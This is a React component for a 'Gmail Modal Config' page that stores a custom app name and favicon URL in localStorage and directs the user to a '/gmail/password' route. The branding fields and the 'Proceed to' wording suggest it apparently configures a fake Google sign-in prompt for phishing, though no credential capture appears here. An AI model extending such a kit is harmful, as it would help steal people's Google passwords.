import React from "react";

// Config page for Gmail modal: favicon URL and app name
const GmailConfigPage = () => {
  const [appName, setAppName] = React.useState(
    localStorage.getItem("gmail_app_name") || ""
  );
  const [faviconUrl, setFaviconUrl] = React.useState(
    localStorage.getItem("gmail_favicon_url") || ""
  );

  const [previewError, setPreviewError] = React.useState(false);

  const handleSave = () => {
    localStorage.setItem("gmail_app_name", appName.trim());
    localStorage.setItem("gmail_favicon_url", faviconUrl.trim());
    alert("Saved! Open /gmail/password to see changes.");
  };

  const handleClear = () => {
    localStorage.removeItem("gmail_app_name");
    localStorage.removeItem("gmail_favicon_url");
    setAppName("");
    setFaviconUrl("");
    setPreviewError(false);
  };

  return (
    <div className="min-h-screen w-full bg-black text-white flex items-center justify-center p-6">
      <div className="w-full max-w-xl bg-gray-900 rounded-xl border border-gray-800 p-6 shadow-2xl">
        <h1 className="text-xl font-semibold mb-4">Gmail Modal Config</h1>

        <div className="space-y-4">
          <div>
            <label className="block text-sm text-gray-300 mb-1">App name (appears next to Proceed to)</label>
            <input
              className="w-full bg-gray-800 border border-gray-700 rounded px-3 py-2 text-white outline-none"
              type="text"
              value={appName}
              onChange={(e) => setAppName(e.target.value)}
              placeholder="e.g. Cryptomus"
            />
          </div>

          <div>
            <label className="block text-sm text-gray-300 mb-1">Favicon URL</label>
            <input
              className="w-full bg-gray-800 border border-gray-700 rounded px-3 py-2 text-white outline-none"
              type="url"
              value={faviconUrl}
              onChange={(e) => {
                setFaviconUrl(e.target.value);
                setPreviewError(false);
              }}
              placeholder="https://example.com/favicon.ico"
            />
            <div className="flex items-center gap-3 mt-3">
              <div className="w-6 h-6 bg-gray-800 border border-gray-700 rounded flex items-center justify-center overflow-hidden">
                {faviconUrl && !previewError ? (
                  <img
                    src={faviconUrl}
                    alt="preview"
                    className="w-5 h-5"
                    onError={() => setPreviewError(true)}
                  />
                ) : (
                  <span className="text-xs text-gray-500">—</span>
                )}
              </div>
              <span className="text-sm text-gray-400">Preview</span>
            </div>
          </div>

          <div className="flex gap-3 pt-2">
            <button
              onClick={handleSave}
              className="px-4 py-2 rounded bg-blue-600 hover:bg-blue-700 text-white"
            >
              Save
            </button>
            <button
              onClick={handleClear}
              className="px-4 py-2 rounded bg-gray-700 hover:bg-gray-600 text-white"
            >
              Clear
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default GmailConfigPage;


